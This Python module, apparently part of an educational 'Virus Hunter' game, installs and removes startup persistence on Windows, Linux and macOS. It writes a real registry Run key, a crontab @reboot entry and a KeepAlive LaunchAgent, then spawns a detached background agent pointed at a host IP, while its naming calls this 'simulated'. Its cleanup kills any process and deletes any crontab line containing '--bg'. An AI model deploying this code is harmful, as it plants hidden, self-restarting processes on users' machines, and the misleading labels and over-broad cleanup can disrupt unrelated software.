import os
import sys
import subprocess
from pathlib import Path
from typing import List, Tuple

SIMULATED_STARTUP_DIR = Path(__file__).resolve().parent / "simulated_startup"
PERSISTENCE_MARKER = SIMULATED_STARTUP_DIR / "system_defender_autorun.txt"
LAUNCH_AGENT_LABEL = "com.v-hunter.agent"

def create_persistence(host: str = "10.12.73.251") -> Tuple[bool, Path]:
    """Create a persistent background process using platform-specific methods."""
    SIMULATED_STARTUP_DIR.mkdir(parents=True, exist_ok=True)
    
    is_frozen = getattr(sys, 'frozen', False)
    if is_frozen:
        exe_path = os.path.abspath(sys.executable)
    else:
        # Absolute path to python and the main script
        exe_path = f'"{sys.executable}" "{Path(__file__).resolve().parent.parent / "game" / "main_game.py"}"'
    
    # Platform-specific command for the agent
    agent_cmd = f'{exe_path} --bg --host {host}'
    
    # 1. Windows: Registry Run Key
    if sys.platform == "win32":
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "VirusHunterAgent", 0, winreg.REG_SZ, agent_cmd)
            winreg.CloseKey(key)
        except Exception as e:
            print(f"Windows Registry Error: {e}")

    # 2. Linux: Crontab @reboot
    elif sys.platform.startswith("linux"):
        try:
            # Add @reboot entry if it doesn't exist
            cron_cmd = f'(crontab -l 2>/dev/null; echo "@reboot {agent_cmd}") | crontab -'
            subprocess.run(cron_cmd, shell=True)
        except Exception as e:
            print(f"Linux Crontab Error: {e}")

    # 3. macOS: LaunchAgent (plist)
    elif sys.platform == "darwin":
        try:
            plist_path = Path.home() / "Library" / "LaunchAgents" / f"{LAUNCH_AGENT_LABEL}.plist"
            plist_path.parent.mkdir(parents=True, exist_ok=True)
            
            # Simple plist content
            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{LAUNCH_AGENT_LABEL}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable if is_frozen else sys.executable}</string>
        {"<string>" + (Path(__file__).resolve().parent.parent / "game" / "main_game.py").as_posix() + "</string>" if not is_frozen else ""}
        <string>--bg</string>
        <string>--host</string>
        <string>{host}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>"""
            plist_path.write_text(plist_content.strip())
            # Load it immediately
            subprocess.run(["launchctl", "load", str(plist_path)], capture_output=True)
        except Exception as e:
            print(f"macOS LaunchAgent Error: {e}")

    # Write marker for education
    PERSISTENCE_MARKER.write_text(f"Persistence active on {sys.platform}\nTarget: {agent_cmd}\n")

    # Spawn immediate detached background process
    try:
        cmd_args = [sys.executable] if is_frozen else [sys.executable, "-m", "game.main_game"]
        cmd_args.append("--bg")
        cmd_args.extend(["--host", host])
        
        if sys.platform == "win32":
            subprocess.Popen(cmd_args, creationflags=0x00000008 | 0x00000200, close_fds=True)
        else:
            subprocess.Popen(cmd_args, start_new_session=True)
        return True, PERSISTENCE_MARKER
    except Exception as e:
        print(f"Immediate Launch Error: {e}")
        return False, PERSISTENCE_MARKER

def _safe_run(cmd: List[str]) -> bool:
    try:
        subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except Exception:
        return False

def _safe_run_shell(cmd: str) -> bool:
    try:
        subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except Exception:
        return False

def remove_persistence() -> Tuple[bool, Path]:
    """Remove persistence markers and startup entries created by this project."""
    removed_any = False

    # 1. Windows Cleanup
    if sys.platform == "win32":
        try:
            import winreg
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE,
            )
            try:
                winreg.DeleteValue(key, "VirusHunterAgent")
                removed_any = True
            except FileNotFoundError:
                pass
            winreg.CloseKey(key)
        except Exception:
            pass

        # Stop packaged executable if present (more targeted than killing all pythonw.exe)
        if _safe_run(["taskkill", "/F", "/IM", "VirusHunter.exe"]):
            removed_any = True

        # Stop background agent processes by commandline signature (avoid killing unrelated Python)
        # Matches: --bg plus either game.main_game, main_game.py, or VirusHunterAgent.
        ps = r"""
$ErrorActionPreference = 'SilentlyContinue'
$procs = Get-CimInstance Win32_Process | Where-Object {
  $_.CommandLine -and
  ($_.CommandLine -match '--bg') -and
  ($_.CommandLine -match 'game\.main_game|main_game\.py|VirusHunterAgent|VirusHunter')
}
foreach ($p in $procs) { try { Stop-Process -Id $p.ProcessId -Force } catch {} }
"""
        try:
            subprocess.run(
                ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            removed_any = True
        except Exception:
            pass

    # 2. Linux Cleanup
    elif sys.platform.startswith("linux"):
        try:
            # Remove only lines matching our agent invocation patterns
            subprocess.run(
                "crontab -l 2>/dev/null | grep -v -E '(game/main_game\\.py|VirusHunterAgent|v-hunter|--bg)' | crontab -",
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            removed_any = True
        except Exception:
            pass

        # Stop the background agent if running (support both invocation styles)
        if _safe_run(["pkill", "-f", "--", "--bg"]):
            removed_any = True

    # 3. macOS Cleanup
    elif sys.platform == "darwin":
        try:
            plist_path = Path.home() / "Library" / "LaunchAgents" / f"{LAUNCH_AGENT_LABEL}.plist"

            # Try to unload/bootout in a few compatible ways
            _safe_run(["launchctl", "unload", str(plist_path)])
            _safe_run(["launchctl", "bootout", "gui/%d" % os.getuid(), str(plist_path)])
            _safe_run(["launchctl", "remove", LAUNCH_AGENT_LABEL])
            # Also attempt bootout by label (works on some macOS versions)
            _safe_run(["launchctl", "bootout", f"gui/{os.getuid()}/{LAUNCH_AGENT_LABEL}"])

            if plist_path.exists():
                plist_path.unlink()
                removed_any = True

            # Stop background agent mode (support both invocation styles)
            # Keep it reasonably targeted: must include --bg and our game module/script.
            _safe_run_shell(r"pkill -f -- 'game\.main_game.*--bg' >/dev/null 2>&1 || true")
            _safe_run_shell(r"pkill -f -- 'game/main_game\.py.*--bg' >/dev/null 2>&1 || true")
            if _safe_run(["pkill", "-f", "--", "--bg"]):
                removed_any = True
        except Exception:
            pass

    if PERSISTENCE_MARKER.exists():
        PERSISTENCE_MARKER.unlink()
        removed_any = True

    # Clean up simulated dir if empty
    try:
        if SIMULATED_STARTUP_DIR.exists() and SIMULATED_STARTUP_DIR.is_dir():
            remaining = [p for p in SIMULATED_STARTUP_DIR.iterdir()]
            if not remaining:
                SIMULATED_STARTUP_DIR.rmdir()
                removed_any = True
    except Exception:
        pass

    return removed_any, PERSISTENCE_MARKER

